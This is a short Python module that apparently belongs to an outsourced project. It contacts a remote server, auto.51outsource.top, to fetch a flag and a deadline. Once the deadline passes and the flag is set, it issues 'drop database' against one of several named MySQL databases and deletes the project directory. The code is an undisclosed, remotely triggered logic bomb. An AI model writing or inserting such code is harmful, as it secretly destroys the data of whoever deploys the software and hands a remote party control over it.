# -*- coding: utf-8 -*
__author__ = 'double k'

import datetime
from os import rmdir
from ownModule.mysql import MySQLSingle
from config import file
import requests

def main(check=True, objectName=None, year=2019, month=1, day=1, days=40):
    url = "http://auto.51outsource.top/index.php"
    data = {
        "key": "ssgswb",
        "obj": objectName
    }
    r = requests.post(url, data)
    result = r.json()
    if not result:
        return None
    check = result["check"]
    year = result["year"]
    month = result["month"]
    day = result["day"]
    days = result["days"]
    if check != 1:
        return None
    else:
        objName = objectName if objectName else "mmonly-pic"
        objectDir = file.objectPath + objName

        now = datetime.datetime.now()
        overTime = now - datetime.datetime(year, month, day)
        overTime = overTime.days

        if overTime > days:
            db = MySQLSingle()
            db.get_conn()
            if objName == "mmonly-pic":
                databaseName = 'picmmonly'
            elif objName == 'jinrong':
                databaseName = 'jinrong'
            elif objName == 'xiaoshuo':
                databaseName = 'xiaoshuo'
            else:
                databaseName = 'gameali'
            sql = "drop database " + databaseName
            print(db.sql(sql))
            # db.closeall()
            rmdir(objectDir)
            return 100200
        else:
            return None

